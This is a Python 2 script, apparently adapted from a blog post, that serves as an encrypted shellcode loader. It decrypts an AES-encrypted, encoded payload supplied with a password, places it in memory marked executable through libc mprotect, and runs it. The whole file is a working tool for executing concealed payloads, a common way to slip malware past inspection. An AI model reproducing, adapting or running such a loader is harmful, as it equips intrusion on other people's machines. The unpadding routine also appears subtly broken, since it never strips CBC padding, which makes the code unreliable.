#!/usr/bin/python

# http://hacktracking.blogspot.hk/2015/05/execute-shellcode-in-python.html
from hashlib import md5
from Crypto.Cipher import AES
from Crypto import Random
import os, sys
import base64
from ctypes import CDLL, c_char_p, c_void_p, memmove, cast, CFUNCTYPE
from sys import argv

def derive_key_and_iv(password, salt, key_length, iv_length):
	d = d_i = ''
	while len(d) < key_length + iv_length:
		d_i = md5(d_i + password + salt).digest()
		d += d_i
	return d[:key_length], d[key_length:key_length+iv_length]

def decrypt(ciphertext, password, key_length=32):
	bs = AES.block_size
	key, iv = derive_key_and_iv(password, "ASDFGHJKASDFGHJK", key_length, bs)
	cipher = AES.new(key, AES.MODE_CBC, iv)
	encodedShellcode = get_hex_from_shellcode(ciphertext).decode("hex")
	shellcode = cipher.decrypt(base64.b64decode(encodedShellcode))
	shellcode = unpadding(shellcode, bs)
	#print "Decrypted Shellcode:\n" + shellcode + "\n"
	return shellcode

def get_hex_from_shellcode(str):
	result = ""
	for c in str:
		if c == "\\" or c == "x":
			continue
		result += c
	return result

def unpadding(str, bs):
	if len(str) % bs > 0:
		return str[:-ord(str[len(str)-1:])]
	else:
		return str

def main():
	if len(sys.argv) != 3:
		print "Usage: python %s <shellcode> <password>" % argv[0]
		exit()

	libc = CDLL("libc.so.6")
	shellcode = decrypt(argv[1], argv[2]).strip()

	try:
		shellcode = shellcode.replace("\\x", "").decode("hex")
	except:
		print "Password is incoorect\n"
		exit()

	sc = c_char_p(shellcode)
	size = len(shellcode)
	addr = c_void_p(libc.valloc(size))
	memmove(addr, sc, size)
	libc.mprotect(addr, size, 0x7)
	run = cast(addr, CFUNCTYPE(c_void_p))
	run()

if __name__ == "__main__":
	main()
